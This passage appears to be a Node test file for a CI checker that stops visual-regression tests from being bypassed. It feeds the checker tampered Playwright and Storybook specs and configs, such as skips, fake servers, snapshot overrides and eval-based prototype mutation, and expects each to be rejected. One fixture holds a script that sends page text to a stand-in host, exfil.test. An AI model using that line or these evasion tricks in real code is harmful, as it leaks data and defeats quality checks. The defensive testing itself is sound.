import assert from "node:assert/strict";
import { symlinkSync } from "node:fs";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { after, test } from "node:test";
import { repoRoot } from "./lib/repo.mjs";
import {
  cleanUpScratchRepos,
  installFromRepo,
  runChecker,
  scratchDir,
  write,
} from "./lib/scratch-repo.mjs";

after(cleanUpScratchRepos);

const INVENTORY = [
  "| Screen | Route | Kind | Stage | Status |",
  "| --- | --- | --- | --- | --- |",
  "| Work list | `/agent/projects/{key}/work?layout=list` | route | P1 | 🟡 |",
  "| Work item detail | `/agent/work-items/{key}` | route | P1 | ✅ |",
  "| Future inbox | `/agent/inbox` | route | P1 | ⬜ |",
].join("\n");

const SCREENS = [
  {
    name: "work-list",
    inventoryRoute: "/agent/projects/{key}/work?layout=list",
    applicationRoute: "/agent/projects/$projectKey/work",
    test: "work list @visual",
    screenshot: "work-list.png",
  },
  {
    name: "work-item-detail",
    inventoryRoute: "/agent/work-items/{key}",
    applicationRoute: "/agent/work-items/$key",
    test: "work item detail @visual",
    screenshot: "work-item-detail.png",
  },
];

function visualSpec(
  screens,
  {
    omitScreenshotFor,
    nestedScreenshotFor,
    disabledFor,
    wrongRouteFor,
    wrongQueryFor,
    additionalNavigationFor,
    additionalVisualOperationFor,
    additionalVisualOperationCode,
    helperNavigationFor,
    nestedNavigationFor,
    screenshotBeforeNavigationFor,
    earlyReturnFor,
    setContentAfterNavigationFor,
    documentInterceptFor,
    shadowedSettleHelperFor,
    shadowedFixtureHelperFor,
    setContentInApiRouteFor,
    computedTaggedSetContentInApiRouteFor,
    enrollmentReadinessFor,
    invalidEnrollmentReadinessFor,
    mutationInVisibilityFor,
    locatorScreenshotFor,
    viewportScreenshotFor,
    shadowedPageBindingFor,
    mutateScreenshotOptionsFor,
    excessiveInlineThresholdFor,
    fakeTestBinding = false,
    computedSkipFor,
    runtimeCode = "",
  } = {},
) {
  const helper = `async function installAuthenticatedFixture(page: Page) {
  await page.route("**/api/**", async (route) => { await route.fulfill({ status: 200 }); });
}`;
  const tests = screens
    .map(({ test: testName, screenshot, applicationRoute, inventoryRoute }) => {
      const applicationPath = applicationRoute.replace(
        /\$[A-Za-z0-9_]+/gu,
        "sample",
      );
      const routeState = inventoryRoute
        ? new URL(inventoryRoute, "http://visual.invalid").search
        : "";
      const navigation =
        testName === wrongRouteFor
          ? "/agent/inbox"
          : `${applicationPath}${testName === wrongQueryFor ? "?layout=board" : routeState}`;
      const screenshotEvidence =
        testName === omitScreenshotFor
          ? ""
          : testName === nestedScreenshotFor
            ? `const unused = () => expect(page).toHaveScreenshot(${JSON.stringify(screenshot)});`
            : testName === locatorScreenshotFor
              ? `await expect(page.getByText("screen ready")).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
              : testName === viewportScreenshotFor
                ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: false });`
                : testName === mutateScreenshotOptionsFor
                  ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
                  : testName === excessiveInlineThresholdFor
                    ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 100000000, threshold: 0, includeAA: true });`
                    : `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true });`;
      const additionalNavigation =
        testName === additionalNavigationFor ? "await page.goto(target);" : "";
      const additionalVisualOperation =
        testName === additionalVisualOperationFor
          ? (additionalVisualOperationCode ??
            "const root = page.locator(\"#storybook-root\"); await root.evaluateHandle(\"() => { document.body.innerHTML = '<main>forged</main>'; fetch('https://exfil.test/?x=' + document.body.innerText); }\");")
          : "";
      const targetDeclaration =
        testName === additionalNavigationFor
          ? 'const target = "/agent/inbox";'
          : "";
      const nestedNavigation =
        testName === nestedNavigationFor
          ? "if (true) { await page.goto('/'); }"
          : "";
      const helperNavigation =
        testName === helperNavigationFor
          ? "await navigateElsewhere(page);"
          : "";
      const earlyReturn =
        testName === earlyReturnFor ? "if (process.env.CI) return;" : "";
      const setContent =
        testName === setContentAfterNavigationFor
          ? 'await page.setContent("<main>pretend screen</main>");'
          : "";
      const mutationInVisibility =
        testName === mutationInVisibilityFor
          ? 'await expect((page.setContent("<main>pretend screen</main>"), document.write("<main>pretend screen</main>"), page.getByText("screen ready"))).toBeVisible();'
          : "";
      const documentIntercept =
        testName === documentInterceptFor
          ? 'await page.route("**/*", (route) => route.fulfill({ body: "<main>pretend screen</main>" }));'
          : "";
      const setContentInApiRoute =
        testName === setContentInApiRouteFor
          ? 'await page.route("**/api/**", async (route) => { await page.setContent("<main>pretend screen</main>"); await route.fulfill({ status: 200 }); });'
          : "";
      const computedTaggedSetContentInApiRoute =
        testName === computedTaggedSetContentInApiRouteFor
          ? 'await page.route("**/api/**", async (route) => { await aliasedPage["setContent"]`<main>pretend screen</main>`; await route.fulfill({ status: 200 }); });'
          : "";
      const shadowedSettleHelper =
        testName === shadowedSettleHelperFor
          ? 'const settleVisuals = async (page) => page.setContent("<main>pretend screen</main>");'
          : "";
      const shadowedFixtureHelper =
        testName === shadowedFixtureHelperFor
          ? 'const installAuthenticatedFixture = async (page) => page.setContent("<main>pretend screen</main>");'
          : "";
      const shadowedPageBinding =
        testName === shadowedPageBindingFor ? "{ const page = {}; }" : "";
      const useShadowedSettleHelper =
        testName === shadowedSettleHelperFor
          ? "await settleVisuals(page);"
          : "";
      const enrollmentReadiness =
        testName === enrollmentReadinessFor
          ? 'await page.locator("#factor-password").fill("visual-enrollment-password"); await expect(page.getByRole("button", { name: "Set up authenticator" })).toBeEnabled();'
          : testName === invalidEnrollmentReadinessFor
            ? 'await page.locator("#other-password").fill("visual-enrollment-password"); await expect(page.getByRole("button", { name: "Set up authenticator" })).toBeEnabled();'
            : "";
      const beforeNavigation =
        testName === screenshotBeforeNavigationFor
          ? `${screenshotEvidence} `
          : "";
      const afterNavigation =
        testName === screenshotBeforeNavigationFor ? "" : screenshotEvidence;
      return `test(${JSON.stringify(testName)}, async ({ page, page: aliasedPage }) => { ${
        testName === disabledFor
          ? 'if (process.env.CI) test.fixme(true, "known issue");'
          : ""
      } ${testName === computedSkipFor ? 'test["skip"](true, "temporarily disabled");' : ""} ${targetDeclaration} ${documentIntercept} ${setContentInApiRoute} ${computedTaggedSetContentInApiRoute} ${shadowedFixtureHelper} await installAuthenticatedFixture(page); ${shadowedPageBinding} ${beforeNavigation}await page.goto(${JSON.stringify(navigation)}); ${earlyReturn} ${setContent} ${additionalNavigation} ${additionalVisualOperation} ${nestedNavigation} ${helperNavigation} ${enrollmentReadiness} ${mutationInVisibility} ${testName === mutationInVisibilityFor ? "" : 'await expect(page.getByText("screen ready")).toBeVisible();'} ${shadowedSettleHelper} ${useShadowedSettleHelper} ${afterNavigation} });`;
    })
    .join("\n");
  const testImport = fakeTestBinding
    ? 'import { expect, test as playwrightTest, type Page } from "@playwright/test";\nconst test = (_title, _callback) => {};'
    : 'import { expect, test, type Page } from "@playwright/test";';
  const screenshotOptions = screens.some(
    ({ test: testName }) => testName === mutateScreenshotOptionsFor,
  )
    ? "const SCREENSHOT_OPTIONS = { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true };\nSCREENSHOT_OPTIONS.maxDiffPixels = 100000000;"
    : "";
  return `${testImport}\n${runtimeCode}\n${screenshotOptions}\n${helper}\n${tests}`;
}

function storybookSpec({
  emptyCallback = false,
  detachedIndex = false,
  omitStoryNavigation = false,
  conditionalSkip = false,
  describeSkip = false,
  describeConfigureSkip = false,
  describeConfigureDynamic = false,
  skipStoryCaptureInCi = false,
  shadowFetch = false,
  storyNavigationWithOtherInterpolation = false,
  reassignStory = false,
  shadowStory = false,
  excessiveInlineThreshold = false,
  pageAliasNavigation = "",
  pageEvaluateCallback = "async () => { await document.fonts.ready; await new Promise<void>((resolve) => requestAnimationFrame(() => resolve())); }",
  storyRootReadCallback = "(root) => root.childElementCount > 0 || Boolean(root.textContent?.trim())",
  additionalPageEvaluation = "",
  additionalLocatorEvaluation = "",
  outsideLoopMutation = "",
  mutateStoriesAfterAssertion = false,
  deleteIndexEntriesBeforeFreeze = false,
  rewriteIndexEntryBeforeFreeze = false,
  freezeStoryIndex = true,
  freezeStoryEntries = true,
  mutateObjectValues = false,
  mutateObjectValuesByAlias = false,
  mutateObjectValuesByOuterAlias = false,
  mutateReflect = false,
  mutateReflectByAlias = false,
  mutateWithEval = false,
  mutateWithEvalAlias = false,
  mutateWithFunction = false,
  computedSkip = false,
  computedAliasSkip = false,
  fakeTestBinding = false,
  runtimeCode = "",
} = {}) {
  const freezeStoryMap = freezeStoryEntries
    ? ".map((story) => Object.freeze(story))"
    : ".map((story) => story)";
  const freezeIndex = freezeStoryIndex
    ? [
        "Object.freeze(index.entries);",
        "Object.values(index.entries).forEach((entry) => { Object.freeze(entry); });",
        "Object.freeze(index);",
      ]
    : [];
  const body = [
    ...(conditionalSkip
      ? ['if (process.env.CI) test.skip(true, "temporarily disabled");']
      : []),
    ...(computedSkip ? ['test["skip"](true, "temporarily disabled");'] : []),
    ...(computedAliasSkip
      ? ['testApi["sk" + "ip"](true, "temporarily disabled");']
      : []),
    ...(mutateWithEval
      ? ['eval("Array.prototype[Symbol.iterator] = function* () {}");']
      : []),
    ...(mutateWithEvalAlias
      ? [
          "const executeSource = eval;",
          'executeSource("Array.prototype[Symbol.iterator] = function* () {}");',
        ]
      : []),
    ...(mutateWithFunction
      ? [
          'new Function("Array.prototype[Symbol.iterator] = function* () {}")();',
        ]
      : []),
    ...(emptyCallback
      ? ["await page.goto('/');"]
      : [
          ...(mutateObjectValues
            ? ["Object.values = (value) => [value[Object.keys(value)[0]]];"]
            : []),
          ...(mutateObjectValuesByAlias
            ? [
                "const objectNamespace = Object;",
                "objectNamespace.values = (value) => [value[Object.keys(value)[0]]];",
              ]
            : []),
          ...(mutateObjectValuesByOuterAlias
            ? [
                "objectNamespace.values = (value) => [value[Object.keys(value)[0]]];",
              ]
            : []),
          ...(mutateReflect
            ? [
                'Reflect.set(Object, "values", (value) => [value[Object.keys(value)[0]]]);',
              ]
            : []),
          ...(mutateReflectByAlias
            ? [
                "const reflectAlias = Reflect;",
                'reflectAlias.set(Object, "values", (value) => [value[Object.keys(value)[0]]]);',
              ]
            : []),
          ...(shadowFetch
            ? [
                'async function fetch(_url) { return { json: async () => ({ entries: { fake: { id: "Button--primary", type: "story" } } }) }; }',
              ]
            : []),
          'const response = await fetch("http://127.0.0.1:6006/index.json");',
          detachedIndex
            ? 'const index = { entries: { fake: { id: "Button--primary", type: "story" } } };'
            : "const index = await response.json();",
          ...(deleteIndexEntriesBeforeFreeze
            ? ["delete index.entries.fake;"]
            : []),
          ...(rewriteIndexEntryBeforeFreeze
            ? ['index.entries.fake.id = "changed";']
            : []),
          ...freezeIndex,
          `const stories = Object.freeze(Object.values(index.entries).filter((entry) => entry.type === "story").sort((left, right) => left.id.localeCompare(right.id))${freezeStoryMap});`,
          "expect(stories.length).toBeGreaterThan(0);",
          ...(mutateStoriesAfterAssertion
            ? ["stories.splice(0, stories.length);"]
            : []),
          ...(outsideLoopMutation ? [outsideLoopMutation] : []),
          `for (${reassignStory ? "let" : "const"} story of stories) {`,
          ...(reassignStory ? ['  story = { id: "Button--primary" };'] : []),
          ...(shadowStory
            ? ['  { const story = { id: "Button--primary" }; void story; }']
            : []),
          ...(pageAliasNavigation ? [pageAliasNavigation] : []),
          ...(omitStoryNavigation
            ? []
            : [
                storyNavigationWithOtherInterpolation
                  ? "  await page.goto(`http://127.0.0.1:6006/iframe.html?id=Button--primary&viewMode=\u0024{story.id}`);"
                  : "  await page.goto(`http://127.0.0.1:6006/iframe.html?id=\u0024{story.id}&viewMode=story`);",
              ]),
          "  await expect.poll(async () => {",
          '    const storyRoot = page.locator("#storybook-root");',
          `    const storyRendered = await storyRoot.evaluate(${storyRootReadCallback});`,
          '    return storyRendered || (await page.getByRole("dialog").isVisible());',
          "  }).toBe(true);",
          `  await page.evaluate(${pageEvaluateCallback});`,
          ...(additionalPageEvaluation ? [additionalPageEvaluation] : []),
          ...(additionalLocatorEvaluation ? [additionalLocatorEvaluation] : []),
          ...(skipStoryCaptureInCi ? ["  if (process.env.CI) continue;"] : []),
          excessiveInlineThreshold
            ? "  await expect(page).toHaveScreenshot(`\u0024{story.id}.png`, { fullPage: true, maxDiffPixels: 100000000, threshold: 0, includeAA: true });"
            : "  await expect(page).toHaveScreenshot(`\u0024{story.id}.png`, { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true });",
          "}",
        ]),
  ].join("\n");
  const testCase = `test("every exported Storybook story has a visual baseline @visual", async ({ page }) => {\n${body}\n});`;
  const testImport = fakeTestBinding
    ? 'import { expect, test as playwrightTest } from "@playwright/test";\nconst test = (_title, _callback) => {};'
    : 'import { expect, test } from "@playwright/test";';
  const prelude = `${testImport}`;
  const outerAlias = mutateObjectValuesByOuterAlias
    ? "\nconst objectNamespace = Object;"
    : "";
  if (describeSkip) {
    return `${prelude}${outerAlias}\ntest.describe.skip("visual Storybook coverage", () => {\n${testCase}\n});`;
  }
  if (describeConfigureSkip) {
    return `${prelude}${outerAlias}\ntest.describe.configure({ mode: "skip" });\n${testCase}`;
  }
  if (describeConfigureDynamic) {
    return `${prelude}${outerAlias}\ntest.describe.configure({ mode: process.env.CI ? "skip" : "default" });\n${testCase}`;
  }
  return `${prelude}${outerAlias}\n${runtimeCode}\n${testCase}`;
}

function routeTree(routes) {
  return routes.map((route) => `fullPath: '${route}'`).join("\n");
}

async function runVisualScope({
  screens = SCREENS,
  routes = [],
  inventory = INVENTORY,
  source = visualSpec(screens),
  storySource = storybookSpec(),
  rootVisualScript,
  webVisualScript,
  webDevScript,
  baseConfig,
  visualConfig,
  storybookConfig,
  storybookMain,
  ciWorkflow,
} = {}) {
  const dir = scratchDir("visual-scope-");
  installFromRepo(dir, "scripts/ci/check-visual-scope.mjs");
  installFromRepo(dir, "scripts/ci/lib/repo.mjs");
  installFromRepo(dir, "package.json");
  installFromRepo(dir, "apps/web/package.json");
  installFromRepo(dir, "apps/web/playwright.config.ts");
  installFromRepo(dir, "apps/web/playwright.visual.config.ts");
  installFromRepo(dir, "apps/web/playwright.storybook.config.ts");
  installFromRepo(dir, "packages/ui/.storybook/main.ts");
  installFromRepo(dir, ".github/workflows/ci-full.yml");
  symlinkSync(
    path.join(repoRoot, "node_modules"),
    path.join(dir, "node_modules"),
    "dir",
  );

  write(dir, "docs/02-design/screen-inventory.md", inventory);
  write(dir, "apps/web/src/routeTree.agent.gen.ts", routeTree(routes));
  write(dir, "apps/web/src/routeTree.portal.gen.ts", routeTree(["/"]));
  write(dir, "apps/web/e2e/visual-screens.json", JSON.stringify(screens));
  write(
    dir,
    "tsconfig.json",
    JSON.stringify({
      compilerOptions: { target: "ESNext", module: "ESNext" },
      include: ["apps/web/e2e/*.ts"],
    }),
  );
  write(dir, "apps/web/e2e/visual.spec.ts", source);
  write(dir, "apps/web/e2e/storybook-visual.spec.ts", storySource);

  for (const [packagePath, script] of [
    ["package.json", rootVisualScript],
    ["apps/web/package.json", webVisualScript],
  ]) {
    if (script === undefined) continue;
    const pkg = JSON.parse(await readFile(path.join(dir, packagePath), "utf8"));
    pkg.scripts["test:visual"] = script;
    write(dir, packagePath, JSON.stringify(pkg, null, 2));
  }
  if (webDevScript !== undefined) {
    const packagePath = path.join(dir, "apps/web/package.json");
    const pkg = JSON.parse(await readFile(packagePath, "utf8"));
    pkg.scripts.dev = webDevScript;
    write(dir, "apps/web/package.json", JSON.stringify(pkg, null, 2));
  }
  if (visualConfig !== undefined) {
    write(dir, "apps/web/playwright.visual.config.ts", visualConfig);
  }
  if (baseConfig !== undefined) {
    write(dir, "apps/web/playwright.config.ts", baseConfig);
  }
  if (storybookConfig !== undefined) {
    write(dir, "apps/web/playwright.storybook.config.ts", storybookConfig);
  }
  if (storybookMain !== undefined) {
    write(dir, "packages/ui/.storybook/main.ts", storybookMain);
  }
  if (ciWorkflow !== undefined) {
    write(dir, ".github/workflows/ci-full.yml", ciWorkflow);
  }

  for (const screen of screens) {
    write(
      dir,
      `apps/web/e2e/visual.spec.ts-snapshots/${screen.screenshot.replace(/\.png$/, "")}-linux.png`,
      "fixture baseline",
    );
  }

  return runChecker(dir, "check-visual-scope.mjs");
}

const INVENTORY_ROUTES = [
  "/agent/projects/$projectKey/work",
  "/agent/work-items/$key",
];

test("G8 requires baselines for active routes and leaves not-started routes planned", async () => {
  const result = await runVisualScope({ routes: INVENTORY_ROUTES });

  assert.equal(result.status, 0, result.output);
  assert.match(
    result.output,
    /2 screenshot cases, 2 active inventory route rows mapped \(3 route rows total\)/,
  );
});

test("G8 rejects a root visual test script that skips the checker and web tests", async () => {
  const result = await runVisualScope({ rootVisualScript: "echo skipped" });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /package\.json test:visual must run check:visual-scope/,
  );
});

test("G8 rejects a web visual test script that skips Playwright", async () => {
  const result = await runVisualScope({ webVisualScript: "echo skipped" });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /apps\/web\/package\.json test:visual must run route and Storybook Playwright configs/,
  );
});

test("G8 rejects a web dev script that does not launch Vite", async () => {
  const result = await runVisualScope({ webDevScript: "node fake-app.mjs" });

  assert.notEqual(result.status, 0);
  assert.match(result.output, /apps\/web\/package\.json dev must launch Vite/);
});

for (const [configPath, optionName, failure] of [
  [
    "apps/web/playwright.config.ts",
    "baseConfig",
    /playwright\.config\.ts must define the e2e directory/,
  ],
  [
    "apps/web/playwright.visual.config.ts",
    "visualConfig",
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  ],
  [
    "apps/web/playwright.storybook.config.ts",
    "storybookConfig",
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  ],
]) {
  test(`G8 rejects top-level early exit in ${path.basename(configPath)}`, async () => {
    const original = await readFile(path.join(repoRoot, configPath), "utf8");
    const modified = original.replace(
      "export default defineConfig({",
      "process.exit(0);\nexport default defineConfig({",
    );
    const result = await runVisualScope({ [optionName]: modified });

    assert.notEqual(result.status, 0);
    assert.match(result.output, failure);
  });
}

test("G8 rejects visual configs that stop selecting the guarded route spec", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    'testMatch: "visual.spec.ts"',
    'testMatch: "e2e.spec.ts"',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config and select the route visual spec serially/,
  );
});

test("G8 rejects a route visual config filter that skips declared route cases", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    '  testMatch: "visual.spec.ts",',
    '  testMatch: "visual.spec.ts",\n  grep: /sign-in screen/,',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a Storybook visual config filter that skips story coverage", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    '  testMatch: "storybook-visual.spec.ts",',
    '  testMatch: "storybook-visual.spec.ts",\n  grepInvert: /exported stories/,',
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects route visual config that updates snapshots instead of comparing", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    'updateSnapshots: "none"',
    'updateSnapshots: "all"',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a computed route config key that overrides snapshot comparison", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original
    .replace(
      'import base from "./playwright.config";',
      'import base from "./playwright.config";\nconst key = "updateSnapshots";',
    )
    .replace(
      '  updateSnapshots: "none",',
      '  updateSnapshots: "none",\n  [key]: "all",',
    );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a second Playwright config argument that overrides the visual selection", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    '  updateSnapshots: "none",\n});',
    '  updateSnapshots: "none",\n}, { updateSnapshots: "all" });',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a computed base config key that filters inherited visual cases", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.config.ts"),
    "utf8",
  );
  const baseConfig = original
    .replace(
      'import { defineConfig, devices } from "@playwright/test";',
      'import { defineConfig, devices } from "@playwright/test";\nconst key = "grep";',
    )
    .replace(
      '  testIgnore: ["visual.spec.ts", "storybook-visual.spec.ts"],',
      '  testIgnore: ["visual.spec.ts", "storybook-visual.spec.ts"],\n  [key]: /sign-in screen/,',
    );
  const result = await runVisualScope({ baseConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.config\.ts must define the e2e directory/,
  );
});

test("G8 rejects an inherited Playwright shard that can select no route cases", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.config.ts"),
    "utf8",
  );
  const baseConfig = original.replace(
    '  testDir: "./e2e",',
    '  testDir: "./e2e",\n  shard: { current: 100, total: 100 },',
  );
  const result = await runVisualScope({ baseConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.config\.ts must define the e2e directory/,
  );
});

test("G8 rejects a route shard that can select no screenshots", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    '  updateSnapshots: "none",',
    '  updateSnapshots: "none",\n  shard: { current: 100, total: 100 },',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a global setup hook that can exit before route screenshots", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    '  updateSnapshots: "none",',
    '  updateSnapshots: "none",\n  globalSetup: "./e2e/skip-g8.ts",',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a route server override after the trusted base config", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    '  updateSnapshots: "none",',
    '  updateSnapshots: "none",\n  webServer: { command: "node fake-app.mjs", url: "http://127.0.0.1:4178/auth/sign-in" },',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects a fake base app server command", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.config.ts"),
    "utf8",
  );
  const baseConfig = original.replace(
    'command: "pnpm dev --host 127.0.0.1 --port 4178 --strictPort"',
    'command: "node fake-app.mjs"',
  );
  const result = await runVisualScope({ baseConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.config\.ts must define the e2e directory/,
  );
});

test("G8 rejects a computed base URL override inside Playwright use settings", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.config.ts"),
    "utf8",
  );
  const baseConfig = original
    .replace(
      'import { defineConfig, devices } from "@playwright/test";',
      'import { defineConfig, devices } from "@playwright/test";\nconst key = "baseURL";',
    )
    .replace(
      '    baseURL: "http://127.0.0.1:4178",',
      '    baseURL: "http://127.0.0.1:4178",\n    [key]: "http://127.0.0.1:9999",',
    );
  const result = await runVisualScope({ baseConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.config\.ts must define the e2e directory/,
  );
});

test("G8 rejects route visual config that disables screenshot assertions", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.visual.config.ts"),
    "utf8",
  );
  const visualConfig = original.replace(
    'updateSnapshots: "none",',
    'updateSnapshots: "none",\n  ignoreSnapshots: true,',
  );
  const result = await runVisualScope({ visualConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.visual\.config\.ts must extend the app Playwright config/,
  );
});

test("G8 rejects Storybook config that updates snapshots instead of comparing", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    'updateSnapshots: "none"',
    'updateSnapshots: "changed"',
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects a computed Storybook config key that overrides snapshot comparison", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original
    .replace(
      'import { defineConfig, devices } from "@playwright/test";',
      'import { defineConfig, devices } from "@playwright/test";\nconst key = "updateSnapshots";',
    )
    .replace(
      '  updateSnapshots: "none",',
      '  updateSnapshots: "none",\n  [key]: "all",',
    );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects a Storybook shard that can select no exported stories", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    '  updateSnapshots: "none",',
    '  updateSnapshots: "none",\n  shard: { current: 100, total: 100 },',
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects a fake Storybook server command", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    '"pnpm --filter @taskdesk/ui exec storybook dev --ci --port 6006 --host 127.0.0.1"',
    '"node fake-storybook.mjs"',
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects a narrowed Storybook source glob", async () => {
  const original = await readFile(
    path.join(repoRoot, "packages/ui/.storybook/main.ts"),
    "utf8",
  );
  const storybookMain = original.replace(
    "../src/**/*.stories.@(ts|tsx)",
    "../src/components/button.stories.tsx",
  );
  const result = await runVisualScope({ storybookMain });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /packages\/ui\/\.storybook\/main\.ts must retain the full TypeScript story glob/,
  );
});

test("G8 rejects a Storybook Vite hook that can alter story discovery", async () => {
  const original = await readFile(
    path.join(repoRoot, "packages/ui/.storybook/main.ts"),
    "utf8",
  );
  const storybookMain = original.replace(
    "plugins: [...(viteConfig.plugins ?? []), tailwindcss()]",
    "plugins: []",
  );
  const result = await runVisualScope({ storybookMain });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /packages\/ui\/\.storybook\/main\.ts must retain the full TypeScript story glob/,
  );
});

test("G8 rejects Storybook config that disables screenshot assertions", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    'updateSnapshots: "none",',
    'updateSnapshots: "none",\n  ignoreSnapshots: true,',
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects a Storybook snapshot directory outside the checked-in baselines", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    "../../packages/ui/src/components/",
    "../../packages/ui/src/stories/",
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects Storybook configs that stop selecting the guarded story spec", async () => {
  const original = await readFile(
    path.join(repoRoot, "apps/web/playwright.storybook.config.ts"),
    "utf8",
  );
  const storybookConfig = original.replace(
    'testMatch: "storybook-visual.spec.ts"',
    'testMatch: "e2e.spec.ts"',
  );
  const result = await runVisualScope({ storybookConfig });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /playwright\.storybook\.config\.ts must select the Storybook visual spec/,
  );
});

test("G8 rejects a CI workflow that no longer invokes the visual test entry point", async () => {
  const original = await readFile(
    path.join(repoRoot, ".github/workflows/ci-full.yml"),
    "utf8",
  );
  const ciWorkflow = original.replace(
    "run: pnpm test:visual",
    "run: echo skipped",
  );
  const result = await runVisualScope({ ciWorkflow });

  assert.notEqual(result.status, 0);
  assert.match(
